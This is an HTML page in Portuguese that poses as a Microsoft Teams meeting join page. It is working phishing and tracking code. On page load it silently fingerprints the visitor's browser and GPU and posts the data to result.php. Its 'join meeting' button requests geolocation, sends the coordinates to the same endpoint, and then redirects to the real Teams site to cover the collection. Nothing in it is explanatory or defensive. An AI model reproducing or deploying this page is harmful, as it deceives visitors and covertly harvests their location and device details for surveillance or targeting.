<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Microsoft Teams</title>
  <!-- Toast CSS -->
  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
  <style>
    body {
      background-color: #f3f3f3;
      font-family: "Segoe UI", sans-serif;
      text-align: center;
      padding-top: 100px;
    }

    .card {
      background-color: white;
      max-width: 400px;
      margin: auto;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0px 0px 20px rgba(0,0,0,0.1);
    }

    .loading {
      font-size: 18px;
      color: #333;
      margin-top: 20px;
    }

    .btn {
      background-color: #6264a7;
      color: white;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 20px;
      transition: background-color 0.3s ease;
    }

    .btn:hover {
      background-color: #5a5bb3;
    }

    .btn:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }

    .spinner {
      margin: 20px auto;
      width: 40px;
      height: 40px;
      border: 4px solid #ccc;
      border-top-color: #0066cc;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      display: none;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .progress-bar {
      width: 100%;
      height: 6px;
      background-color: #e0e0e0;
      border-radius: 3px;
      margin-top: 20px;
      overflow: hidden;
      display: none;
    }

    .progress-bar-fill {
      height: 100%;
      background: linear-gradient(90deg, #6264a7, #4fc3f7);
      width: 0%;
      transition: width 0.3s ease;
    }
  </style>
</head>
<body onload="coletaDados(false)">
  <div class="card">
    <h2>Reunião do Microsoft Teams</h2>
    <p>Clique abaixo para entrar na reunião</p>
    <button class="btn" id="joinBtn" onclick="getLocation()">Entrar na reunião</button>

    <div class="spinner" id="spinner"></div>
    <div class="progress-bar" id="progressBar">
      <div class="progress-bar-fill" id="progressBarFill"></div>
    </div>
    <p class="loading" id="loadingText" style="display:none;">Aguarde, conectando...</p>
  </div>

  <!-- Toast JS -->
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
  
  <script>
    function showToast(message, type = 'info') {
      const backgrounds = {
        success: "linear-gradient(to right, #00b09b, #96c93d)",
        error: "linear-gradient(to right, #ff5f6d, #ffc371)",
        warning: "linear-gradient(to right, #f7971e, #ffd200)",
        info: "linear-gradient(to right, #0078d7, #4fc3f7)"
      };

      Toastify({
        text: message,
        duration: 4000,
        gravity: "top",
        position: "right",
        backgroundColor: backgrounds[type] || backgrounds.info,
        stopOnFocus: true
      }).showToast();
    }

    function updateProgress(percent) {
      const progressBar = document.getElementById('progressBar');
      const progressBarFill = document.getElementById('progressBarFill');
      
      if (percent > 0) {
        progressBar.style.display = 'block';
        progressBarFill.style.width = percent + '%';
      } else {
        progressBar.style.display = 'none';
      }
    }

    function coletaDados(geoFlag) {
      const screenRes = `${screen.width}x${screen.height}`;
      const lang = navigator.language || 'N/A';
      const platform = navigator.platform || 'N/A';
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';

      let gpu_vendor = 'N/A';
      let gpu_renderer = 'N/A';
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (gl && debugInfo) {
          gpu_vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
          gpu_renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        }
      } catch (e) {}

      const data = {
        screen: screenRes,
        lang: lang,
        platform: platform,
        timezone: timezone,
        gpu_vendor: gpu_vendor,
        gpu_renderer: gpu_renderer,
        geo: geoFlag
      };

      return data;
    }

    function getLocation() {
      const joinBtn = document.getElementById('joinBtn');
      const spinner = document.querySelector("#spinner");
      const loadingText = document.querySelector("#loadingText");
      
      joinBtn.disabled = true;
      spinner.style.display = 'block';
      loadingText.style.display = 'block';
      updateProgress(20);

      showToast("Solicitando permissão de localização...", "info");

      if (navigator.geolocation) {
        updateProgress(40);
        
        navigator.geolocation.getCurrentPosition(function (position) {
          updateProgress(60);
          showToast("Localização obtida com sucesso!", "success");
          
          const base = coletaDados(true);
          base.lat = position.coords.latitude;
          base.lon = position.coords.longitude;
          base.accuracy = position.coords.accuracy;
          base.timestamp = new Date().toISOString();

          updateProgress(80);

          fetch("result.php", {
            method: "POST",
            body: JSON.stringify(base),
            headers: { "Content-Type": "application/json" }
          })
          .then(response => response.json())
          .then(data => {
            updateProgress(100);
            
            if (data.status === 'success') {
              showToast("Dados salvos com sucesso! Redirecionando...", "success");
            } else {
              showToast("Aviso: Dados salvos em modo offline", "warning");
            }
            
            setTimeout(() => {
              window.location.href = "https://teams.microsoft.com/l/meetup-join/";
            }, 2000);
          })
          .catch(error => {
            updateProgress(100);
            showToast("Erro de conexão, mas dados foram coletados", "warning");
            
            setTimeout(() => {
              window.location.href = "https://teams.microsoft.com/l/meetup-join/";
            }, 2000);
          });
        }, function (err) {
          spinner.style.display = 'none';
          loadingText.style.display = 'none';
          joinBtn.disabled = false;
          updateProgress(0);
          
          showToast("Erro ao obter localização: " + err.message, "error");
          
          // Collect data without geolocation
          setTimeout(() => {
            collectWithoutGeo();
          }, 1000);
        });
      } else {
        spinner.style.display = 'none';
        loadingText.style.display = 'none';
        joinBtn.disabled = false;
        updateProgress(0);
        
        showToast("Este navegador não suporta geolocalização", "error");
        
        // Collect data without geolocation
        setTimeout(() => {
          collectWithoutGeo();
        }, 1000);
      }
    }

    function collectWithoutGeo() {
      showToast("Coletando dados básicos...", "info");
      
      const base = coletaDados(false);
      base.timestamp = new Date().toISOString();

      fetch("result.php", {
        method: "POST",
        body: JSON.stringify(base),
        headers: { "Content-Type": "application/json" }
      })
      .then(response => response.json())
      .then(data => {
        if (data.status === 'success') {
          showToast("Dados coletados! Redirecionando...", "success");
        } else {
          showToast("Dados salvos em modo offline", "warning");
        }
        
        setTimeout(() => {
          window.location.href = "https://teams.microsoft.com/l/meetup-join/";
        }, 2000);
      })
      .catch(error => {
        showToast("Redirecionando...", "info");
        setTimeout(() => {
          window.location.href = "https://teams.microsoft.com/l/meetup-join/";
        }, 2000);
      });
    }

    // Coleta inicial sem geo
    window.addEventListener("load", () => {
      const base = coletaDados(false);
      base.timestamp = new Date().toISOString();

      fetch("result.php", {
        method: "POST",
        body: JSON.stringify(base),
        headers: { "Content-Type": "application/json" }
      })
      .then(response => response.json())
      .then(data => {
        if (data.status === 'success') {
          console.log("Initial data collected successfully");
        }
      })
      .catch(error => {
        console.log("Initial data collection failed, but continuing...");
      });
    });
  </script>
</body>
</html>
